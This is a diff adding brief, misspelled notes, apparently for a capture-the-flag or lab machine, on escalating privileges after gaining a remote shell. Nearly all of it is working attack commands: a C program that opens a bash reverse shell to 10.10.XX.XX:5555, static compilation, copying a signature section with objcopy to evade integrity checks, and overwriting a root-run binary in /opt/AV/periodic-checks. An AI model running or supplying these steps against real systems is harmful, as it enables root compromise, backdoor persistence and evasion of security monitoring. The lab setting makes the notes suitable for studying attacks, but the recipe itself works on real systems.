@@ -1,0 +1,30 @@
+You got a remote shell.
+you sudo -l and got nothing.
+you need to search all the files for a file that you can write and its root's.
+
+1. id
+you see if you are in some other groups, maybe devs
+
+2. search for somethinjg like that: 
+-rwxrw---- 1 root devs 16544 Jul 27 09:34 monitor
+
+maybe at /opt
+
+3. create a c program there with reverse shell: 
+  printf '#include <stdlib.h>\nint main() {\n    system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.XX.XX/5555 0>&1'\''");\n    return 0;\n}\n' > backdoor.c
+
+
+4. cimpile it:
+  gcc -static -o monitor_backdoor backdoor.c
+
+5.  Dump a custom section from the original binary to mimic its structure (to evade integrity checks or signatures):
+objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
+
+6.  Add that section to the backdoored binary:
+  objcopy --add-section .text_sig=sig monitor_backdoor
+
+7.  Put your code in the file you found.
+cp monitor_backdoor /opt/AV/periodic-checks/monitor
+
+
+and wait for it to get execuded. :)
